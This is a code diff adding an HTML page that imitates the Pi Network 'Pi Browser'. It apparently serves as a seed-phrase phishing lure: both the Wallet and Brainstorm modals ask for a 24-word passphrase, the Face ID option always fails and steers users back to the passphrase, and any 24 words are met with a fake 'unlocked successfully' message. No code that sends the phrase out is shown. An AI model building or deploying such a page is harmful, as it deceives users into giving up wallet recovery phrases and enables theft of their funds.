@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Browser</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            overflow-y: auto;
+        }
+        .top-image {
+            margin-top: 15px;
+            width: 100px;
+            height: auto;
+        }
+        .title {
+            margin-top: 30px;
+            font-size: 24px;
+            color: #ffb44c;
+        }
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(3, 110px);
+            grid-template-rows: repeat(3, 110px);
+            gap: 8px;
+            margin: 60px 0 20px 0;
+        }
+        .grid-item {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            background-color: transparent;
+        }
+        .grid-item img {
+            width: 90px;
+            height: 90px;
+            object-fit: contain;
+            transition: transform 0.3s ease;
+        }
+        .grid-item:hover img {
+            transform: scale(1.1);
+        }
+        .grid-item:active img {
+            transform: scale(0.95);
+        }
+        .blank-space {
+            height: 150px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .blank-space button {
+            padding: 12px 50px;
+            font-size: 16px;
+            background-color: #6d318d;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .blank-space button:hover {
+            background-color: #5a2a6d;
+        }
+
+        /* Modal Styles */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background-color: white;
+            padding: 25px;
+            border-radius: 15px;
+            width: 85%;
+            max-width: 400px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+        }
+        .modal-content h2 {
+            color: #6d318d;
+            margin: 10px 0 20px 0;
+            text-align: center;
+            font-size: 22px;
+        }
+        .modal-content textarea {
+            width: 100%;
+            height: 120px;
+            padding: 12px;
+            margin: 0 0 15px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            resize: none;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .modal-content textarea:focus {
+            outline: none;
+            border-color: #6d318d;
+        }
+        .unlock-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        .unlock-options button {
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .passphrase {
+            background: white;
+            color: #6d318d;
+            border: 2px solid #6d318d;
+        }
+        .passphrase:hover {
+            background: #f5f0fa;
+        }
+        .face-id {
+            background: #6d318d;
+            color: white;
+            border: none;
+        }
+        .face-id:hover {
+            background: #5a2a6d;
+        }
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin: -10px 0 10px 0;
+            display: none;
+        }
+        .info-message {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+        }
+        .info-message a {
+            color: #6d318d;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .info-message a:hover {
+            text-decoration: underline;
+        }
+        .back-icon {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            font-size: 24px;
+            cursor: pointer;
+            color: #6d318d;
+            transition: transform 0.2s;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+        .back-icon:hover {
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body>
+    <img src="pilogo.png" alt="Pi Logo" class="top-image">
+    <h1 class="title">Welcome to the Pi Browser</h1>
+
+    <div class="grid-container">
+        <div class="grid-item" onclick="window.location.href='https://fireside.pinet.com/me'">
+            <img src="fireside.png" alt="Fire Side">
+        </div>
+        <div class="grid-item" onclick="showModal('wallet')">
+            <img src="wallet.png" alt="Wallet">
+        </div>
+        <div class="grid-item" onclick="showModal('brainstorm')">
+            <img src="brainstorm.png" alt="Brainstorm">
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://mine.pinet.com'">
+            <img src="mine.png" alt="Mine">
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://blockexplorer.minepi.com'">
+            <img src="blockchain.jpg" alt="Blockchain">
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://develop.pinet.com'">
+            <img src="develop.png" alt="Develop">
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://kyc.pinet.com'">
+            <img src="kyc.png" alt="KYC">
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://chat.pinet.com'">
+            <img src="chat.jpg" alt="Chat">
+        </div>
+        <div class="grid-item" onclick="window.location.href='https://profiles.pinet.com'">
+            <img src="profile.png" alt="Profile">
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div class="modal-overlay" id="walletModal">
+        <div class="modal-content">
+            <button class="back-icon" onclick="hideModal('walletModal')">←</button>
+            <h2>Unlock Pi Wallet</h2>
+            <textarea id="walletPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+            <div class="error-message" id="walletErrorMessage">Please enter exactly 24 words.</div>
+            <div class="unlock-options">
+                <button class="passphrase" onclick="validatePassphrase('walletPassphraseInput', 'walletErrorMessage')">Unlock With Passphrase</button>
+                <button class="face-id" onclick="showFaceIDError()">Unlock With Face ID</button>
+            </div>
+            <div class="info-message">
+                <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                <p>Lost your passphrase? <a href="#" onclick="redirectToNewWallet()">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Brainstorm Modal -->
+    <div class="modal-overlay" id="brainstormModal">
+        <div class="modal-content">
+            <button class="back-icon" onclick="hideModal('brainstormModal')">←</button>
+            <h2>Unlock Pi Wallet</h2>
+            <textarea id="brainstormPassphraseInput" placeholder="Enter your 24-word passphrase here"></textarea>
+            <div class="error-message" id="brainstormErrorMessage">Please enter exactly 24 words.</div>
+            <div class="unlock-options">
+                <button class="passphrase" onclick="validatePassphrase('brainstormPassphraseInput', 'brainstormErrorMessage')">Unlock With Passphrase</button>
+                <button class="face-id" onclick="showFaceIDError()">Unlock With Face ID</button>
+            </div>
+            <div class="info-message">
+                <p>As a secure feature, your Brainstorm passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+                <p>Lost your passphrase? <a href="#" onclick="redirectToNewAccount()">You can create a new account</a>, but your previous Brainstorm data will be inaccessible.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="blank-space">
+        <button onclick="window.location.href='https://ecosystem.pinet.com'">EXPLORE THE ECOSYSTEM</button>
+    </div>
+
+    <script>
+        function showModal(modalType) {
+            const modalId = `${modalType}Modal`;
+            document.getElementById(modalId).style.display = "flex";
+        }
+        
+        function hideModal(modalId) {
+            document.getElementById(modalId).style.display = "none";
+        }
+        
+        function validatePassphrase(inputId, errorId) {
+            const input = document.getElementById(inputId);
+            const error = document.getElementById(errorId);
+            const words = input.value.trim().split(/\s+/).filter(w => w.length > 0);
+            
+            if (words.length === 24) {
+                error.style.display = "none";
+                unlockWithPassphrase(inputId.includes('wallet') ? 'Wallet' : 'Brainstorm');
+            } else {
+                error.style.display = "block";
+            }
+        }
+        
+        function unlockWithPassphrase(service) {
+            alert(`${service} unlocked successfully!`);
+            hideModal(service.toLowerCase() + 'Modal');
+        }
+        
+        function showFaceIDError() {
+            alert("Face ID is not available at the moment. Please try with passphrase.");
+        }
+        
+        function redirectToNewWallet() {
+            if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
+                window.location.href = "https://example.com/create-new-wallet";
+            }
+        }
+        
+        function redirectToNewAccount() {
+            if (confirm("This will create a new Brainstorm account. Your previous data will be inaccessible. Continue?")) {
+                window.location.href = "https://example.com/create-new-brainstorm-account";
+            }
+        }
+    </script>
+</body>
+</html>
